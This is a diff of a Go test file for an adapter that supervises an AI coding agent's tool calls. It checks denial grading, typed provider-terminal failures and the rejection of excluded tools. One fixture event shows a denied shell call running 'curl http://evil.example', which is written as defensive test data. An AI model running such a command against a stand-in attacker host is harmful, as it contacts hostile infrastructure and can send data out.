@@ -437,7 +437,7 @@ func TestRunDeclaredToolsCollectSuccessNamesAndSkipDenials(t *testing.T) {
 		`printf '%s\n' '{"type":"tool","tool_call_id":"t1","tool_name":"read_file"}'`,
 		`printf '%s\n' '{"type":"tool","tool_call_id":"t2","tool_name":"edit"}'`,
 		`printf '%s\n' '{"type":"tool","tool_call_id":"t3","tool_name":"read_file"}'`,
-		`printf '%s\n' '{"type":"tool","tool_call_id":"t4","tool_name":"grep","args":{"path":"'"$PWD"'/source.go"},"is_error":true,"error":"permission denied"}'`,
+		`printf '%s\n' '{"type":"tool","tool_call_id":"t4","tool_name":"read_file","args":{"absolute_path":"'"$PWD"'/source.go"},"is_error":true,"error":"permission denied"}'`,
 		resultEvent("success", 2, 1),
 	}, "\n")
 	fixture := newRunFixture(t, supportedBinary, body)
@@ -457,7 +457,7 @@ func TestRunDeclaredToolsCollectSuccessNamesAndSkipDenials(t *testing.T) {
 	if err := json.Unmarshal(metadata, &meta); err != nil {
 		t.Fatal(err)
 	}
-	// read_file normalizes to read; the denied grep probe must not be
+	// read_file normalizes to read; the denied read probe must not be
 	// collected as a successful call.
 	if strings.Join(meta.ToolNames, ",") != "edit,read" {
 		t.Fatalf("toolNames = %v, want exactly [edit read]", meta.ToolNames)
@@ -659,11 +659,6 @@ func TestRunRejectsProtocolViolations(t *testing.T) {
 			message: "without a result event",
 		},
 		{
-			name:    "failed-result",
-			body:    initEvent("session-1", supportedBinary) + "\n" + resultEvent("error_max_turns", 0, 0),
-			message: "expected success",
-		},
-		{
 			name:    "trailing-event-after-success",
 			body:    initEvent("session-1", supportedBinary) + "\n" + resultEvent("success", 1, 1) + "\n" + `printf '%s\n' '{"type":"assistant"}'`,
 			message: "trailing event after result",
@@ -700,6 +695,23 @@ func TestRunRejectsProtocolViolations(t *testing.T) {
 			}
 		})
 	}
+	t.Run("failed-result-is-typed-provider-terminal", func(t *testing.T) {
+		// 非 success 的 result subtype 不再拼接自由文本，而是 typed
+		// provider-terminal/do-not-retry；exitCode=0 不构成成功证据。
+		body := initEvent("session-1", supportedBinary) + "\n" + resultEvent("error_max_turns", 0, 0)
+		fixture := newRunFixture(t, supportedBinary, body)
+		_, err := fixture.adapter.Run(context.Background(), fixture.request)
+		failure, ok := port.AsAdapterFailure(err)
+		if !ok || failure.Kind != port.FailureKindProviderTerminal || failure.Disposition != port.RetryDispositionDoNotRetry || failure.Adapter != port.AdapterIDQwen {
+			t.Fatalf("err = %v, want typed provider-terminal failure", err)
+		}
+		if errors.Is(err, context.Canceled) {
+			t.Fatalf("typed failure must not degrade to context error: %v", err)
+		}
+		if _, statErr := os.Stat(filepath.Join(fixture.controlRoot, "output", "qwen-transcript.jsonl")); statErr != nil {
+			t.Fatal("transcript evidence was not preserved on typed failure")
+		}
+	})
 }
 
 func TestRunRejectsDeclarationViolations(t *testing.T) {
@@ -1118,15 +1130,29 @@ func TestRunGradesPermissionDenialsFromToolErrors(t *testing.T) {
 		}
 		assertDenialLog(t, fixture.controlRoot, map[string]any{"seq": float64(1), "tool": "read_file", "kind": "read", "grade": "FATAL", "path-or-cmd": outside})
 	})
-	t.Run("shell denial always fatal", func(t *testing.T) {
+	t.Run("excluded tool denial is a typed protocol violation", func(t *testing.T) {
+		// shell 属于冻结排除表：携带它的 tool 事件在身份验证阶段就 typed
+		// protocol-invalid，不得落地为 denial 证据或改变权限统计。
 		body := strings.Join([]string{
 			initEvent("session-1", supportedBinary),
 			`printf '%s\n' '{"type":"tool","tool_call_id":"t1","tool_name":"shell","args":{"command":"curl http://evil.example"},"is_error":true,"error":"permission denied"}'`,
 			resultEvent("success", 1, 1),
 		}, "\n")
 		fixture := newRunFixture(t, supportedBinary, body)
-		if _, err := fixture.adapter.Run(context.Background(), fixture.request); !errors.Is(err, ErrPermissionDenied) {
-			t.Fatalf("execute denial must grade FATAL: %v", err)
+		_, err := fixture.adapter.Run(context.Background(), fixture.request)
+		failure, ok := port.AsAdapterFailure(err)
+		if !ok || failure.Kind != port.FailureKindProtocolInvalid || failure.Disposition != port.RetryDispositionDoNotRetry || !errors.Is(err, ErrProtocol) {
+			t.Fatalf("err = %v, want typed protocol-invalid for excluded tool", err)
+		}
+		if _, statErr := os.Stat(filepath.Join(fixture.controlRoot, "output", "denials.jsonl")); !os.IsNotExist(statErr) {
+			t.Fatalf("excluded tool event must not write denial evidence: %v", statErr)
+		}
+		metadata, metaErr := os.ReadFile(filepath.Join(fixture.controlRoot, "output", "qwen-transcript-meta.json"))
+		if metaErr != nil {
+			t.Fatal(metaErr)
+		}
+		if !strings.Contains(string(metadata), `"permissionDenied": false`) || !strings.Contains(string(metadata), `"denialsFatal": 0`) || !strings.Contains(string(metadata), `"toolCalls": 0`) {
+			t.Fatalf("excluded tool event polluted metadata: %s", metadata)
 		}
 	})
 	t.Run("non-permission tool error is not a denial", func(t *testing.T) {
